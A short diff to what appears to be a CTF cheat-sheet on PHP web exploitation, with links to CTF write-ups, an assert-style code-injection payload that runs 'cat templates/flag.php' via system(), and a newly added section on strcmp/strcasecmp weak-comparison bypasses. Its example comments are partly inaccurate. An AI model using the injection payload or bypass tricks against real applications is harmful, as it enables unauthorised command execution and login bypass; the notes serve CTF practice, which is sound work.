@@ -1,4 +1,4 @@
-# php
+# +
 
 - https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur
 - https://www.arneswinnen.net/2013/11/hack-lu-2013-ctf-wannabe-writeup-part-one-web-exploitation/
@@ -16,4 +16,15 @@
 
 ```
 flag','..')+or+system('cat+templates/flag.php');//
+```
+
+# type juggling, weak comparison
+
+```php
+<?php
+strcmp($_GET['user'], "admin") == 0
+// => "admin1"
+
+strcasecmp($_GET['secret'], "0x1337") == 0
+// => ["1"]
 ```
